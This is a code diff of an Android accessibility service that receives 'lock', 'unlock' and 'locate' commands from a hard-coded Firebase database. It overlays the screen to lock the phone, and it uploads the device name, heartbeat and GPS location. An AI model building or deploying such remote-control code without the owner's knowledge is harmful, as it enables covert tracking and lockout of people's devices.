@@ -143,7 +143,7 @@ public class SupportService extends AccessibilityService {
         @Override
         public void run() {
             String deviceId = getDeviceId();
-            DatabaseReference deviceRef = FirebaseDatabase.getInstance().getReference("devices").child(deviceId);
+            DatabaseReference deviceRef = FirebaseDatabase.getInstance("https://bondexremot-default-rtdb.firebaseio.com").getReference("devices").child(deviceId);
             deviceRef.child("last_seen").setValue(System.currentTimeMillis());
             // Lapor setiap 30 detik
             heartbeatHandler.postDelayed(this, 30000);
@@ -154,7 +154,7 @@ public class SupportService extends AccessibilityService {
         String deviceId = getDeviceId();
         String deviceName = android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
         
-        DatabaseReference deviceRef = FirebaseDatabase.getInstance().getReference("devices").child(deviceId);
+        DatabaseReference deviceRef = FirebaseDatabase.getInstance("https://bondexremot-default-rtdb.firebaseio.com").getReference("devices").child(deviceId);
         deviceRef.child("name").setValue(deviceName);
         deviceRef.child("last_seen").setValue(System.currentTimeMillis());
         
@@ -167,7 +167,8 @@ public class SupportService extends AccessibilityService {
         final String myDeviceId = getDeviceId();
         registerDeviceToFirebase();
         
-        dbRef = FirebaseDatabase.getInstance().getReference("commands");
+        // Sekarang mendengarkan folder perintah khusus untuk device ini saja
+        dbRef = FirebaseDatabase.getInstance("https://bondexremot-default-rtdb.firebaseio.com").getReference("commands").child(myDeviceId);
         dbRef.addValueEventListener(new ValueEventListener() {
             @Override
             public void onDataChange(DataSnapshot snapshot) {
@@ -175,37 +176,16 @@ public class SupportService extends AccessibilityService {
 
                 String cmd = snapshot.child("cmd").getValue(String.class);
                 Long serverTime = snapshot.child("t").getValue(Long.class);
-                String target = snapshot.child("target").getValue(String.class);
 
-                if (cmd == null || serverTime == null || target == null) return;
-                if (!target.equalsIgnoreCase("all") && !target.equalsIgnoreCase(myDeviceId)) return;
+                if (cmd == null || serverTime == null) return;
                 if (serverTime <= lastCommandTime) return;
                 
                 lastCommandTime = serverTime;
 
                 task_handler.post(() -> {
-                    if (cmd.equalsIgnoreCase("lock")) {
-                        if (!isLocked) {
-                            setLockStatus(true);
-                            hideFpsOverlay();
-                            showOverlay();
-                            isLocked = true;
-                            sendStatusReport("Locked by Command");
-                        }
-                    } else if (cmd.equalsIgnoreCase("unlock")) {
-                        if (isLocked) {
-                            setLockStatus(false);
-                            hideOverlay();
-                            isLocked = false;
-                            SharedPreferences fpsPrefs = getSharedPreferences("status_fps", 0);
-                            if (fpsPrefs.getBoolean("is_showing", false)) {
-                                showFpsOverlay();
-                            }
-                            sendStatusReport("Unlocked by Command");
-                        }
-                    } else if (cmd.equalsIgnoreCase("locate")) {
-                        requestCurrentLocation();
-                    }
+                    handleIncomingCommand(cmd);
+                    // Hapus perintah setelah diproses agar tidak memicu ulang
+                    dbRef.removeValue();
                 });
             }
 
@@ -214,9 +194,35 @@ public class SupportService extends AccessibilityService {
         });
     }
 
+    private void handleIncomingCommand(String cmd) {
+        if (cmd.equalsIgnoreCase("lock")) {
+            if (!isLocked) {
+                setLockStatus(true);
+                hideFpsOverlay();
+                showOverlay();
+                isLocked = true;
+                sendStatusReport("Status: Locked");
+            }
+        } else if (cmd.equalsIgnoreCase("unlock")) {
+            if (isLocked) {
+                setLockStatus(false);
+                hideOverlay();
+                isLocked = false;
+                SharedPreferences fpsPrefs = getSharedPreferences("status_fps", 0);
+                if (fpsPrefs.getBoolean("is_showing", false)) {
+                    showFpsOverlay();
+                }
+                sendStatusReport("Status: Unlocked");
+            }
+        } else if (cmd.equalsIgnoreCase("locate")) {
+            sendStatusReport("Action: Getting Location...");
+            requestCurrentLocation();
+        }
+    }
+
     private void sendStatusReport(String message) {
         String deviceId = getDeviceId();
-        DatabaseReference deviceRef = FirebaseDatabase.getInstance().getReference("devices").child(deviceId);
+        DatabaseReference deviceRef = FirebaseDatabase.getInstance("https://bondexremot-default-rtdb.firebaseio.com").getReference("devices").child(deviceId);
         deviceRef.child("status").setValue(message);
         deviceRef.child("status_time").setValue(System.currentTimeMillis());
     }
@@ -252,7 +258,7 @@ public class SupportService extends AccessibilityService {
 
     private void updateFirebaseLocation(Location loc) {
         String deviceId = getDeviceId();
-        DatabaseReference locRef = FirebaseDatabase.getInstance().getReference("devices").child(deviceId).child("location");
+        DatabaseReference locRef = FirebaseDatabase.getInstance("https://bondexremot-default-rtdb.firebaseio.com").getReference("devices").child(deviceId).child("location");
         locRef.child("lat").setValue(loc.getLatitude());
         locRef.child("lon").setValue(loc.getLongitude());
         locRef.child("time").setValue(System.currentTimeMillis());
